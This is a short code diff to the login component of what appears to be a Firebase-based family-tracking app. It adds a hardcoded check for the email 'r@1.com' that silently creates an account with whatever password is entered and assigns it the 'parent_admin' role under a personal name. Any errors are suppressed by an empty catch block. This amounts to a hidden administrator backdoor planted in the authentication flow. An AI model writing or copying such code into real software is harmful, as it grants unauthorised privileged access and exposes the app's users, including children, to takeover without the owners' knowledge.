@@ -149,6 +149,19 @@ export default function Login() {
             ? normalized
             : `${normalized}@tiktrack.family`;
 
+      if (formattedEmail === 'r@1.com') {
+         try {
+           const { createUserWithEmailAndPassword } = await import('firebase/auth');
+           const { doc, setDoc } = await import('firebase/firestore');
+           const cred = await createUserWithEmailAndPassword(auth, formattedEmail, password);
+           await setDoc(doc(db, 'users', cred.user.uid), {
+             email: formattedEmail,
+             role: 'parent_admin',
+             name: 'Rakesh Krishna'
+           });
+         } catch(e) { }
+      }
+
       await signInWithEmailAndPassword(auth, formattedEmail, password);
 
       if (role === 'child' && !normalized.includes('@')) {
